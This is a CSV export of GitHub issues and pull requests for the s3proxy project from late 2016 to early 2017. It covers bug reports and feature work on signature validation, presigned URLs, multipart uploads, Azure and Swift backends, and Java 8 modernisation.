gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/192,211658499,MDU6SXNzdWUyMTE2NTg0OTk=,192,md5 validation at aws client sdk,3241357,closed,FALSE,NA,NA,4,2017-03-03T11:02:35Z,2017-03-07T13:23:05Z,2017-03-03T18:14:26Z,CONTRIBUTOR,NA,"In the current usage of s3 proxy, we have to disable md5 validation in put object and get object. And we are using azure backend using s3 proxy. And for us, md5 validation is important at the client side. Is there any way we can get the md5 of the object while connecting to azure backed using s3proxy. What does it take to support it in s3 proxy. I have also raised the issue in jclouds regarding the same thing.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/192/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/192/comments,https://api.github.com/repos/gaul/s3proxy/issues/192/events,https://github.com/gaul/s3proxy/issues/192,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/191,211188355,MDU6SXNzdWUyMTExODgzNTU=,191,Allow larger Azure multipart upload parts,848247,closed,FALSE,NA,NA,0,2017-03-01T19:48:17Z,2018-02-22T08:34:27Z,2018-02-22T08:34:27Z,OWNER,NA,[JCLOUDS-1223](https://issues.apache.org/jira/browse/JCLOUDS-1223) allows 100 MB instead of 4 MB Azure multipart upload parts.  When jclouds 2.1.0 releases S3Proxy should update to take advantage of this.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/191/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/191/comments,https://api.github.com/repos/gaul/s3proxy/issues/191/events,https://github.com/gaul/s3proxy/issues/191,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/190,211057046,MDExOlB1bGxSZXF1ZXN0MTA4NTIwNzQ2,190,changes for java 1.8,21223502,closed,FALSE,NA,NA,4,2017-03-01T11:42:03Z,2017-03-07T01:51:33Z,2017-03-07T01:51:33Z,NONE,NA,"Changes done to move to java 1.8.

This project uses a moderniser-maven-plugin which showed the below issues. I resolved them in this pull request.

```
[ERROR] /Users/sthakur/s3proxy/src/main/java/org/gaul/s3proxy/S3Proxy.java:106: Prefer java.util.Optional
[ERROR] /Users/sthakur/s3proxy/src/main/java/org/gaul/s3proxy/S3ProxyHandler.java:1583: Prefer java.util.Base64.Decoder or java.util.Base64.Encoder
[ERROR] /Users/sthakur/s3proxy/src/main/java/org/gaul/s3proxy/S3ProxyHandler.java:1759: Prefer java.util.Base64.Decoder or java.util.Base64.Encoder
[ERROR] /Users/sthakur/s3proxy/src/main/java/org/gaul/s3proxy/S3ProxyHandler.java:2233: Prefer java.util.Base64.Decoder or java.util.Base64.Encoder
[ERROR] /Users/sthakur/s3proxy/src/main/java/org/gaul/s3proxy/S3ProxyHandler.java:2519: Prefer java.util.Base64.Decoder or java.util.Base64.Encoder
```",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/190/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/190/comments,https://api.github.com/repos/gaul/s3proxy/issues/190/events,https://github.com/gaul/s3proxy/pull/190,https://api.github.com/repos/gaul/s3proxy/pulls/190
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/189,209542675,MDU6SXNzdWUyMDk1NDI2NzU=,189,Remove SUPPORTED_PARAMETERS,848247,closed,FALSE,NA,NA,1,2017-02-22T18:38:42Z,2017-04-25T21:15:26Z,2017-04-25T21:15:26Z,OWNER,NA,Amazon ignores spurious parameters but S3Proxy emits `NotImplemented`.  This whitelist only exists to ignore not yet implemented features like v4 signing via query parameters.  Instead S3Proxy should have a blacklist of known unsupported parameters which will allow removing unneeded configuration like #186.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/189/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/189/comments,https://api.github.com/repos/gaul/s3proxy/issues/189/events,https://github.com/gaul/s3proxy/issues/189,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/188,209451903,MDExOlB1bGxSZXF1ZXN0MTA3NDA1MzY2,188,Add verification in testAwsV2UrlSigningWithOverrideParameters for override parameters.,9978192,closed,FALSE,NA,NA,1,2017-02-22T13:20:28Z,2017-03-04T08:50:16Z,2017-03-04T08:50:16Z,CONTRIBUTOR,NA,"Add verification about content-disposition, Expires, etc. ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/188/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/188/comments,https://api.github.com/repos/gaul/s3proxy/issues/188/events,https://github.com/gaul/s3proxy/pull/188,https://api.github.com/repos/gaul/s3proxy/pulls/188
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/187,209208076,MDExOlB1bGxSZXF1ZXN0MTA3MjMyNzQ0,187,This change makes S3Proxy able to validate presigned url which ,9978192,closed,FALSE,NA,NA,2,2017-02-21T16:59:45Z,2017-02-22T06:15:36Z,2017-02-22T06:15:10Z,CONTRIBUTOR,NA,"has override parameters, i.e. ""content-disposition"",
""response-content-encoding"".",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/187/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/187/comments,https://api.github.com/repos/gaul/s3proxy/issues/187/events,https://github.com/gaul/s3proxy/pull/187,https://api.github.com/repos/gaul/s3proxy/pulls/187
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/186,208933297,MDExOlB1bGxSZXF1ZXN0MTA3MDQzMTU3,186,Add support for ignoring unknown parameters,1654912,closed,FALSE,NA,NA,6,2017-02-20T16:49:04Z,2017-02-22T19:04:59Z,2017-02-22T18:39:38Z,NONE,NA,"Presigned URLs may contain additional parameters in the URL which will
be used “as is” by the client uploading/downloading content from S3.

CLOSES #138",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/186/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/186/comments,https://api.github.com/repos/gaul/s3proxy/issues/186/events,https://github.com/gaul/s3proxy/pull/186,https://api.github.com/repos/gaul/s3proxy/pulls/186
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/185,208223764,MDExOlB1bGxSZXF1ZXN0MTA2NTk4NTMy,185,"Added Docker environment variable ""S3PROXY_CORS_ALLOW_ALL""",480125,closed,FALSE,NA,NA,2,2017-02-16T19:38:57Z,2017-02-22T19:39:21Z,2017-02-16T21:49:50Z,CONTRIBUTOR,NA,"refs issues #142
refs Pull #144

The default value is false",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/185/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/185/comments,https://api.github.com/repos/gaul/s3proxy/issues/185/events,https://github.com/gaul/s3proxy/pull/185,https://api.github.com/repos/gaul/s3proxy/pulls/185
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/184,207700614,MDU6SXNzdWUyMDc3MDA2MTQ=,184,"Doesn't support ""UNSIGNED-PAYLOAD""",153160,closed,FALSE,NA,NA,0,2017-02-15T03:38:30Z,2017-02-16T02:18:52Z,2017-02-16T02:18:52Z,NONE,NA,"AWS allows not to include payload checksum in signature calculation, but s3proxy doesn't.

```
When you send a request, you must tell Amazon S3 which of the preceding options you have chosen in your signature calculation, by adding the x-amz-content-sha256 header with one of the following values:

If you choose chunked upload options, set the header value to STREAMING-AWS4-HMAC-SHA256-PAYLOAD.
If you choose to upload payload in a single chunk, set the header value to the payload checksum (signed payload option), or set the value to the literal string UNSIGNED-PAYLOAD (unsigned payload option).
```

ref:
http://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-auth-using-authorization-header.html
http://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-header-based-auth.html",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/184/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/184/comments,https://api.github.com/repos/gaul/s3proxy/issues/184/events,https://github.com/gaul/s3proxy/issues/184,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/183,202992005,MDU6SXNzdWUyMDI5OTIwMDU=,183,HTTP BASIC authentication,848247,open,FALSE,NA,NA,1,2017-01-25T01:49:20Z,2019-07-11T18:52:08Z,NA,OWNER,NA,This would allow traditional web clients to talk to S3Proxy.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/183/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/183/comments,https://api.github.com/repos/gaul/s3proxy/issues/183/events,https://github.com/gaul/s3proxy/issues/183,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/182,201513557,MDU6SXNzdWUyMDE1MTM1NTc=,182,500 instead of 404 when getting a blob that doesn't exist with public-read bucket,1772540,closed,FALSE,NA,NA,2,2017-01-18T09:01:22Z,2017-03-11T06:49:47Z,2017-03-11T06:49:47Z,COLLABORATOR,NA,"```
W 01-18 00:57:08.679 S3Proxy-18 o.e.jetty.server.HttpChannel:396 |::] http://127.0.0.1:8080/nrcxt0gq4l7b3kpm/test
java.lang.RuntimeException: java.nio.file.NoSuchFileException: /tmp/s3proxy/nrcxt0gq4l7b3kpm/test
        at com.google.common.base.Throwables.propagate(Throwables.java:160)
        at org.jclouds.filesystem.strategy.internal.FilesystemStorageStrategyImpl.getBlobAccess(FilesystemStorageStrategyImpl.java:574)
        at org.jclouds.blobstore.config.LocalBlobStore.getBlobAccess(LocalBlobStore.java:403)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
        at com.sun.proxy.$Proxy39.getBlobAccess(Unknown Source)
        at org.gaul.s3proxy.S3ProxyHandler.doHandleAnonymous(S3ProxyHandler.java:662)
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:360)
        at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:260)
        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)
        at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.lang.Thread.run(Thread.java:745)
Caused by: java.nio.file.NoSuchFileException: /tmp/s3proxy/nrcxt0gq4l7b3kpm/test
        at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86)
        at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102)
        at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107)
        at sun.nio.fs.UnixFileAttributeViews$Posix.readAttributes(UnixFileAttributeViews.java:218)
        at sun.nio.fs.UnixFileAttributeViews$Posix.readAttributes(UnixFileAttributeViews.java:131)
        at sun.nio.fs.UnixFileSystemProvider.readAttributes(UnixFileSystemProvider.java:144)
        at sun.nio.fs.LinuxFileSystemProvider.readAttributes(LinuxFileSystemProvider.java:99)
        at java.nio.file.Files.readAttributes(Files.java:1737)
        at java.nio.file.Files.getPosixFilePermissions(Files.java:2004)
        at org.jclouds.filesystem.strategy.internal.FilesystemStorageStrategyImpl.getBlobAccess(FilesystemStorageStrategyImpl.java:572)
        ... 18 common frames omitted
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/182/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/182/comments,https://api.github.com/repos/gaul/s3proxy/issues/182/events,https://github.com/gaul/s3proxy/issues/182,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/181,200771384,MDU6SXNzdWUyMDA3NzEzODQ=,181,JavaScript middlewares,848247,open,FALSE,NA,NA,1,2017-01-14T01:43:49Z,2017-07-06T23:47:26Z,NA,OWNER,NA,S3Proxy middlewares presently require writing Java code and integrating them into the main S3Proxy binary during compile time.  Instead S3Proxy should dynamically load scripts at run time to allow casual users to programmatically react to client requests.  S3Proxy must provide some external interface to the jclouds `BlobStore` interface.  Nashorn bundled with JDK 8 should make loading JavaScript easy.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/181/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/181/comments,https://api.github.com/repos/gaul/s3proxy/issues/181/events,https://github.com/gaul/s3proxy/issues/181,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/180,198615572,MDU6SXNzdWUxOTg2MTU1NzI=,180,S3Proxy thread management,848247,open,FALSE,NA,NA,1,2017-01-04T02:12:38Z,2017-05-06T01:55:01Z,NA,OWNER,NA,"Presently S3Proxy uses the default Jetty thread pool.  S3Proxy should cap the maximum threads at some value to avoid exhausting resources.  S3Proxy should also gracefully handle backpressure in this situation, returning 503 when clients exhaust the thread pool.  Note that this issue requires more investigation of how Jetty works since it likely provides this functionality but S3Proxy needs to configure it.  Previous discussion in #170.  @kishore25kumar",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/180/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/180/comments,https://api.github.com/repos/gaul/s3proxy/issues/180/events,https://github.com/gaul/s3proxy/issues/180,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/179,196866200,MDU6SXNzdWUxOTY4NjYyMDA=,179,objects should return binary/octet-stream when no content type is specified during put,1772540,open,FALSE,NA,NA,2,2016-12-21T07:40:15Z,2018-01-10T07:44:26Z,NA,COLLABORATOR,NA,currently s3proxy returns application/unknown vs aws s3 returns binary/octet-stream,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/179/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/179/comments,https://api.github.com/repos/gaul/s3proxy/issues/179/events,https://github.com/gaul/s3proxy/issues/179,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/178,196231408,MDExOlB1bGxSZXF1ZXN0OTg0NDkxNTU=,178,S3proxy presigned url fail with override parameters,9978192,closed,FALSE,NA,NA,1,2016-12-17T16:56:51Z,2017-02-21T17:00:54Z,2017-02-21T17:00:54Z,CONTRIBUTOR,NA,"This change makes S3Proxy able to validate presigned url which has override parameters, i.e. ""content-disposition"", ""response-content-encoding"".",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/178/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/178/comments,https://api.github.com/repos/gaul/s3proxy/issues/178/events,https://github.com/gaul/s3proxy/pull/178,https://api.github.com/repos/gaul/s3proxy/pulls/178
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/177,195725954,MDU6SXNzdWUxOTU3MjU5NTQ=,177,error for openstack-keystone,22991883,closed,FALSE,NA,NA,3,2016-12-15T06:19:38Z,2017-05-25T23:09:31Z,2017-05-25T23:09:31Z,NONE,NA,"I am trying to use ""jclouds.provider=openstack-keystone"" to access swift, but get the following exception. I see someone mentioned ""swift-keystone"", but that's not recognized by s3proxy.

Exception in thread ""main"" java.lang.IllegalArgumentException: api {id=openstack-keystone, name=OpenStack Keystone Essex+ API, views=[], endpointName=Keystone base url ending in /v${jclouds.api-version}/, identityName=${tenantName}:${userName} or ${userName}, if your keystone supports a default tenant, credentialName=Optional.of(${password}), documentation=http://api.openstack.org/, api=interface org.jclouds.openstack.keystone.v2_0.KeystoneApi} not wrappable as org.jclouds.blobstore.BlobStoreContext; context: org.jclouds.rest.ApiContext<org.jclouds.openstack.keystone.v2_0.KeystoneApi>, views: []
        at org.jclouds.ContextBuilder.buildView(ContextBuilder.java:611)
        at org.jclouds.ContextBuilder.buildView(ContextBuilder.java:595)
        at org.jclouds.ContextBuilder.build(ContextBuilder.java:588)
        at org.gaul.s3proxy.Main.createBlobStore(Main.java:257)
        at org.gaul.s3proxy.Main.main(Main.java:140)
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/177/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/177/comments,https://api.github.com/repos/gaul/s3proxy/issues/177/events,https://github.com/gaul/s3proxy/issues/177,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/176,194274383,MDExOlB1bGxSZXF1ZXN0OTcwNzc5NTE=,176,Make handle x methods overridable,9978192,closed,FALSE,NA,NA,11,2016-12-08T08:26:59Z,2017-07-22T14:48:45Z,2017-05-25T23:02:31Z,CONTRIBUTOR,NA,"The purpose of making these methods to be overridable is that sub-class want to
leverage S3ProxyHandler to check authentication. And return a presigned url if
a special header is present, instead of doing actual work. This change makes it
possible for sub-class to customize before or after S3ProxyHandler actually
handle the object.

The reason to change pom.xml to use checkstyle 7.3 is to allow setting
'ignoredAnnotations'. Otherwise, it is hard to make handleXYZ methods to be
overridable.

The override method in sub-class may need info in request. Adding
request and response to all handleXYZ methods make them consistent.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/176/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/176/comments,https://api.github.com/repos/gaul/s3proxy/issues/176/events,https://github.com/gaul/s3proxy/pull/176,https://api.github.com/repos/gaul/s3proxy/pulls/176
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/175,192318927,MDExOlB1bGxSZXF1ZXN0OTU3MTg0Mjc=,175,Allow endpoint of s3proxy to have service path (aka context),9978192,closed,FALSE,NA,NA,1,2016-11-29T15:49:46Z,2017-02-21T07:53:20Z,2017-02-21T07:53:20Z,CONTRIBUTOR,NA,"Sometimes service is not the only service under a domain(hostname).
This work adds s3proxy.service-path to allow s3proxy to be deployed
with a context path. The issues resolved by adding service path are
1. properly extract bucket and key, 
2. properly validate signagure
for authentication, 
3. properly validate signagure for presigend url.

Test cases are changed to run when s3proxy.service-path is set.
Right now the setting is commented out so that all tests without
setting it. We need figure out a way to enable it in tests.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/175/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/175/comments,https://api.github.com/repos/gaul/s3proxy/issues/175/events,https://github.com/gaul/s3proxy/pull/175,https://api.github.com/repos/gaul/s3proxy/pulls/175
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/174,192165687,MDU6SXNzdWUxOTIxNjU2ODc=,174,S3Proxy doesn't properly validate signature when its endpoint has context,9978192,closed,FALSE,NA,NA,0,2016-11-29T01:40:53Z,2016-11-29T15:30:48Z,2016-11-29T15:30:48Z,CONTRIBUTOR,NA,"I found this when using s3proxy in my application. I want to configure s3proxy to require authentication using aws-v2. But when I tried to test w/ s3curl, it fails w/ error SignatureDoesNotMatch. 

It turns out that the string signed by s3curl contains hostname. But s3proxy doesn't take hostname as part of string to be signed. 

> s3curl: StringToSign='PUT\n\n\nMon, 28 Nov 2016 12:24:58 +0000\n/**example.org**/s3proxy/bucket/hello.txt'

> S3ProxyHandle 3 org.gaul.s3proxy.S3ProxyHandler createAuthorizationSignature stringToSign: PUT\n\nMon, 28 Nov 2016 12:24:58 +0000\n/s3proxy/bucket/hello.txt


According to http://docs.aws.amazon.com/general/latest/gr/signature-version-2.html, hostname should be part of signed string. But it is confusing that none of s3curl or s3proxy add hostname which should be after http method, e.g. 'PUT\nexample.org\n...'. 

Another problem is in signature-version-2.html, it says, 

> Add the HTTP host header (endpoint) in lowercase, followed by a newline character. The port information is omitted if it is the standard port for the protocol (port 80 for HTTP and port 443 for HTTPS), but included if it is a nonstandard port.

However, s3curl doesn't add port at all. So I think s3proxy probably need a configuration (or parameter) to know if port should be part of signed string. 
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/174/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/174/comments,https://api.github.com/repos/gaul/s3proxy/issues/174/events,https://github.com/gaul/s3proxy/issues/174,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/173,190594386,MDU6SXNzdWUxOTA1OTQzODY=,173,AWS S3 Client DeleteObjectsRequest Quiet parameter,82745,closed,FALSE,NA,NA,1,2016-11-21T00:07:23Z,2016-11-21T09:44:46Z,2016-11-21T00:40:53Z,NONE,NA,"AWS delete objects endpoint supports Quiet parameter but s3proxy doesn't support this parameter. When we use s3proxy for mocking AWS S3 and use Quiet parameter, it fails.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/173/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/173/comments,https://api.github.com/repos/gaul/s3proxy/issues/173/events,https://github.com/gaul/s3proxy/issues/173,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/172,190322362,MDU6SXNzdWUxOTAzMjIzNjI=,172,Multipart failure,6039708,closed,FALSE,NA,NA,3,2016-11-18T13:44:12Z,2016-11-21T21:34:13Z,2016-11-21T10:46:18Z,NONE,NA,"I think I've observed an instance of the recently added multipart upload support not working.

To reproduce:
- Use s3proxy 1.5.1 with the following s3proxy.conf
  ```
  s3proxy.authorization=none
  s3proxy.endpoint=http://127.0.0.1:9000
  jclouds.provider=filesystem
  jclouds.filesystem.basedir=/path/to/test/s3
  ```
- Use the latest Java Amazon SDK (aws-java-sdk-1.11.56.jar)
- Run this Java program (imports omitted for brevity):
  ```
	public static void main(String[] args) {
		AmazonS3Client client = new AmazonS3Client(new BasicAWSCredentials(""test"", ""test""));
		client.setEndpoint(""http://localhost:9000"");
		client.setS3ClientOptions(S3ClientOptions.builder().setPathStyleAccess(true).build());

		if (client.doesBucketExist(""test""))
			System.out.println(""Bucket 'test' exists"");
		else {
			System.out.println(""Making bucket 'test'"");
			client.createBucket(""test"");
		}
		System.out.println(client.listBuckets());
		client.putObject(""test"", ""goodbye"", ""Goodbye, World!"");

		System.out.println(client.getObjectMetadata(""test"", ""goodbye"").getContentMD5());
	}
  ```

s3proxy throws an exception with the message `Content-Length mismatch, actual: 187 expected: 15`. Changing the `setS3ClientOptions` line to `disableChunkedEncoding()` makes the program work.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/172/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/172/comments,https://api.github.com/repos/gaul/s3proxy/issues/172/events,https://github.com/gaul/s3proxy/issues/172,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/171,190033311,MDU6SXNzdWUxOTAwMzMzMTE=,171,Be able to get presigned url of object storage,9978192,closed,FALSE,NA,NA,4,2016-11-17T12:27:27Z,2016-11-29T01:25:50Z,2016-11-29T01:25:50Z,CONTRIBUTOR,NA,@andrewgaul suppose the deployment is app<->s3proxy<->aws. app need get pre-signed url issued by aws. Can S3Proxy provide it? ,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/171/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/171/comments,https://api.github.com/repos/gaul/s3proxy/issues/171/events,https://github.com/gaul/s3proxy/issues/171,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/170,189931965,MDU6SXNzdWUxODk5MzE5NjU=,170,Hystrix support,3241357,closed,FALSE,NA,NA,13,2016-11-17T04:11:38Z,2017-05-29T13:17:52Z,2017-04-07T18:37:16Z,CONTRIBUTOR,NA,"@andrewgaul I want to encapsulate calls to backend (to azure, aws) using hystrix. Can we discuss on it further. Here is the link to hystrix https://github.com/Netflix/Hystrix. Hystrix helps in fast failover and it provides circuit breaker pattern and many more. The github link has more information about it",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/170/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/170/comments,https://api.github.com/repos/gaul/s3proxy/issues/170/events,https://github.com/gaul/s3proxy/issues/170,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/169,189033665,MDU6SXNzdWUxODkwMzM2NjU=,169,Refactor S3ProxyHandler into component parts,848247,open,FALSE,NA,NA,7,2016-11-14T05:49:42Z,2018-02-11T16:23:17Z,NA,OWNER,NA,"Breaking the almost 3,000 line `S3ProxyHandler` into component authentication, bucket, object, and multipart classes will make it easier to understand.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/169/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/169/comments,https://api.github.com/repos/gaul/s3proxy/issues/169/events,https://github.com/gaul/s3proxy/issues/169,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/168,188883157,MDU6SXNzdWUxODg4ODMxNTc=,168,Implement list objects v2,848247,closed,FALSE,NA,NA,4,2016-11-12T01:19:45Z,2019-02-13T18:06:41Z,2019-02-13T18:06:41Z,OWNER,NA,"Breaks `marker` into `continuation-token` and `start-after` and adds `fetch-owner` option.  Reference:

https://docs.aws.amazon.com/AmazonS3/latest/API/v2-RESTBucketGET.html",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/168/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/168/comments,https://api.github.com/repos/gaul/s3proxy/issues/168/events,https://github.com/gaul/s3proxy/issues/168,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/167,188071703,MDU6SXNzdWUxODgwNzE3MDM=,167,Remove Main class from jar,848247,closed,FALSE,NA,NA,1,2016-11-08T18:45:29Z,2017-05-06T01:55:38Z,2017-05-06T01:55:38Z,OWNER,NA,We should only include `Main` in the executable.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/167/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/167/comments,https://api.github.com/repos/gaul/s3proxy/issues/167/events,https://github.com/gaul/s3proxy/issues/167,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/166,187990592,MDU6SXNzdWUxODc5OTA1OTI=,166,s3 multipart upload to openstack swift changes file checksum,23337722,closed,FALSE,NA,NA,5,2016-11-08T13:24:02Z,2016-11-18T19:09:30Z,2016-11-18T14:09:04Z,NONE,NA,"I tried to use the multi-part upload via s3proxy to openstack swift. But the file gets corrupted / changed on the way and the checksum of uploaded file in openstack differs from the original file. The size of files are the same. Is this known issue? Regular uploads worked fine. 

I tested it with 1.5.0 prelease. ",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/166/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/166/comments,https://api.github.com/repos/gaul/s3proxy/issues/166/events,https://github.com/gaul/s3proxy/issues/166,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/165,187629174,MDExOlB1bGxSZXF1ZXN0OTI1MjY0ODg=,165,Refactor to be used outside of Jetty,9978192,closed,FALSE,NA,NA,4,2016-11-07T05:38:54Z,2016-11-08T18:44:51Z,2016-11-08T06:11:26Z,CONTRIBUTOR,NA,"Refactor S3ProxyHandler to be agnostic to Jetty. Added a new file, S3ProxyHandlerJetty, to have codes related to Jetty.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/165/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/165/comments,https://api.github.com/repos/gaul/s3proxy/issues/165/events,https://github.com/gaul/s3proxy/pull/165,https://api.github.com/repos/gaul/s3proxy/pulls/165
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/164,186999549,MDU6SXNzdWUxODY5OTk1NDk=,164,Signed URL not working,3241357,closed,FALSE,NA,NA,3,2016-11-03T08:24:31Z,2016-11-03T18:19:00Z,2016-11-03T08:45:19Z,CONTRIBUTOR,NA,"I am trying to upload a content to azure using aws signed urls. I was able to generate the signed url but when I am posting data to it I am getting 403 forbidden error.

Here is the link to code where it is throwing the error 
https://github.com/andrewgaul/s3proxy/blob/master/src/main/java/org/gaul/s3proxy/S3ProxyHandler.java#L364

How can I resolve this?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/164/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/164/comments,https://api.github.com/repos/gaul/s3proxy/issues/164/events,https://github.com/gaul/s3proxy/issues/164,NA
